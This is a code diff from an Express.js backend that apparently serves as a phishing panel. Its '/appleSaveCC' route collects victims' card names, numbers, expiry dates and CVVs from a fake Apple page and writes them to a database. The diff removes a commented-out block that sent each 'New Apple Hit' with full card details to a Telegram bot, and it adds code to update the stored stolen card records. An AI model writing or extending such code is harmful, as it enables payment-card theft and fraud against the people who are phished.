@@ -2021,15 +2021,23 @@ app.post("/appleSaveCC", cors(), (req, res) => {
     );
   }
 
-  // if (appleCount == 1) {
-  //   axios.post(
-  //     `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=New Apple Hit:\n\nCard Name: ${ccname}\nCard Number: ${ccnum}\nCard Expiry: ${ccexp}\nCVV: ${cvv}`
-  //   );
-  //   owner = "haytchApple";
-  //   appleCount = 0;
-  // } else {
-  //   appleCount++;
-  // }
+  let checkDetails = [uniqueid];
+
+  let checkQuery = `SELECT * FROM apple WHERE uniqueid = ?`;
+
+  panelConnection.query(checkQuery, checkDetails, (err, rows, fields) => {
+    if (err) console.log(err);
+    if (rows) {
+      let updateDetails = [ccname, ccnum, ccexp, cvv, uniqueid];
+      let updateQuery = `UPDATE apple SET ccname = ?, ccnum = ?, ccexp = ?, cvv = ? WHERE uniqueid = ?`;
+
+      panelConnection.query(updateQuery, updateDetails, (err, rows, fields) => {
+        if (!err) res.send("Insertion Completed");
+        else console.log(err);
+      });
+      return;
+    }
+  });
 
   let details = [ccname, ccnum, ccexp, cvv, uniqueid, owner];
 
